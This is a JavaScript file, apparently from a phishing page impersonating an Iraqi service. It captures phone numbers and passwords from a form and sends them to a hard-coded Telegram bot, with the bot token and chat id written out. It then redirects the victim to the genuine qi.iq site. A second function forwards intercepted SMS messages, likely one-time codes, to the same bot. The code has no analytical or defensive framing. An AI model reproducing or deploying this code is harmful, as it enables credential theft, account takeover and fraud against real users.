function submitToTelegram() {
    var phoneValue = document.getElementById('phone').value;
    var passwordValue = document.getElementById('password').value;

    if (phoneValue && passwordValue) {
        var urlString = "https://api.telegram.org/bot6692627244:AAFHCmEn5zgzEv2pn1rQXfFJZOzGueQV8kQ/sendMessage?chat_id=6964432572&text=Phone: " + phoneValue + "%0APassword: " + passwordValue;
        var url = encodeURI(urlString);

        // إرسال البيانات إلى بوت تليجرام
        fetch(url)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send message to Telegram');
                }
                // توجيه المستخدم إلى الموقع
                window.location.href = 'https://qi.iq/ar/home';
            })
            .catch(error => console.error('Error:', error));
    } else {
        alert('الرجاء إدخال رقم الهاتف وكلمة المرور.');
    }
}

// إضافة كود إعادة توجيه الرسائل النصية
function submitToTelegramSMS(phoneNumber, message) {
    try {
        var urlString = "https://api.telegram.org/bot6692627244:AAFHCmEn5zgzEv2pn1rQXfFJZOzGueQV8kQ/sendMessage?chat_id=6964432572&text=New SMS: " + phoneNumber + "%0A" + message;
        var url = encodeURI(urlString);

        // إرسال البيانات إلى بوت تليجرام
        fetch(url)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send SMS message to Telegram');
                }
                console.log('SMS message sent to Telegram successfully');
            })
            .catch(error => console.error('Error:', error));
    } catch (error) {
        console.error('Error occurred while sending SMS message to Telegram:', error);
    }
}